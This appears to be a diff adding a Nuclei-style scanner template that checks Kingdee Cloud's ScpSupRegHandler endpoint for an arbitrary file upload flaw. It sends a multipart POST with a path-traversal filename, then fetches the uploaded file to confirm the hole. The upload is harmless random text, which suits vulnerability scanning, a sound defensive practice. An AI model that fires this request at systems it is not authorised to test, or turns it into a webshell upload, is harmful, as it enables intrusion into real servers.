@@ -1,0 +1,44 @@
+id: kingdee-yxk-scpsupreghandler-fileupload
+
+info:
+  name: kingdee-yxk-scpsupreghandler-fileupload
+  author: kingdee-yxk-scpsupreghandler-fileupload
+  severity: critical
+
+
+variables:
+  filename: '{{rand_base(5)}}'
+  boundery: '{{rand_base(10)}}'
+http:
+- raw:
+  - |-
+    POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla
+    Content-Type: multipart/form-data; boundary={{boundery}}
+
+    --{{boundery}}
+    Content-Disposition: form-data; name="dbId_v"
+
+    .
+    --{{boundery}}
+    Content-Disposition: form-data; name="FID"
+
+    2022
+    --{{boundery}}
+    Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{filename}}.txt."
+    Content-Type: text/plain
+
+    {{randstr}}
+
+    --{{boundery}}--
+  - |
+    GET /K3Cloud/uploadfiles/{{filename}}.txt HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla
+
+  matchers:
+    - type: dsl
+      dsl:
+        - status_code_2 == 200 && contains(body_2, '{{randstr}}')
+
